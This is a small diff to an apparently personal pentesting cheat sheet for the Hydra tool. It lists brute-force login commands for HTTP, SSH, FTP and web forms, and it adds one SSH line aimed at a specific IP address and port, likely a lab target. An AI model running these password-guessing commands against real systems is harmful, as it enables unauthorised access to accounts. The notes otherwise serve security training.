@@ -3,6 +3,7 @@
 
 - Can brute force FTP, SSH, HTTP, SMTP, POP3, IMAP, MYSQL, MSSQL, VNC, RDP:
 - HTTP: `hydra -L usernames.txt -P passwords.txt www.example.com http-get`
+- Single SSH: `hydra -l satwossh -P 2023-200_most_used_passwords.txt 94.237.52.228 -s 56874 ssh -I`
 - Multiple SSH servers: `hydra -l root -p toor -M targets.txt ssh`
 - FTP on non-standard port: `hydra -L usernames.txt -P passwords.txt -s 2121 -V ftp.example.com ftp`
 - Web Login Form: `hydra -l admin -P passwords.txt www.example.com http-post-form "/login:user=^USER^&pass=^PASS^:S=302"`
